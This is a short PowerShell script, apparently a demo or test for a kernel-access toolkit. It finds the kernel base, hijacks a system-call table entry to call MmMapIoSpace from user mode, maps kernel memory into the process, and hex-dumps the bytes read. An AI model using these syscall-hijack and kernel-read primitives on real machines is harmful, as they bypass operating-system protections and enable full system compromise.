Clear-Host
Write-Host

$VA = Get-KernelBaseAddress
$PA = Resolve-DirectoryTable -VA64 $VA -ProcessID 4

$Address = Invoke-SsdtNtCallHijack -Function MmMapIoSpace -Values @([Int64]$PA, [Int64]1024, 1)
if ($Address -ne 0L) {
	$tmpAddress = [IntPtr]::Add($Address, 0)
	Read-VirtualAddress -VA $tmpAddress -BlockSize 96 | Format-HexView -Mode 16x
}

Write-Host
$BindObj = Bind-KernelAddress -VA $VA
if ($BindObj -ne $null) {
    $tmpData    = [Byte[]]::new(96)
    $tmpAddress = [IntPtr]::Add($BindObj.BaseVA,  $BindObj.ByteOffset)
    [marshal]::Copy($tmpAddress, $tmpData, 0, 96)
    $tmpData | Format-HexView -Mode 16x
    Bind-KernelAddress -Package $BindObj -Release
}

Write-Host
return